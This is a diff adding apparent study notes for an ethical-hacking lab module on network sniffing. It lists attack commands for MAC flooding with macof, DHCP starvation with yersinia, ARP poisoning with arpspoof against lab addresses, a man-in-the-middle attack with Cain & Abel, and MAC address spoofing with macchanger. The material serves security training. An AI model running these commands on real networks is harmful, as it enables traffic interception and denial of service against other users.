@@ -650,3 +650,26 @@
 - `DNSQuerySniffer`
 - [DNSstuff](https://www.dnsstuff.com)
 - [Sonar Lite](https://constellix.com) 
+
+
+
+## Module 08: Sniffing
+### Lab 1: Perform Active Sniffing
+#### Task 1: Perform MAC Flooding using macof
+- `macof -i eth0 -d [Target IP Address]`
+#### Task 2: Perform a DHCP Starvation Attack using Yersinia
+- `yersinia -I`
+#### Task 3: Perform ARP Poisoning using arpspoof
+- `arpspoof -i eth0 -t 10.10.1.1 10.10.1.11`
+- `arpspoof -i eth0 -t 10.10.1.11 10.10.1.1`
+#### Task 4: Perform an Man-in-the-Middle (MITM) Attack using Cain & Abel
+- `Cain & Abel`
+#### Task 5: Spoof a MAC Address using TMAC and SMAC
+- `TMAC`
+- `SMAC`
+#### Task 6: Spoof a MAC Address of Linux Machine using macchanger
+- ```sh
+  ifconfig eth0 down
+  macchanger -a eth0
+  macchanger -r eth0
+  ifconfig eth0 up
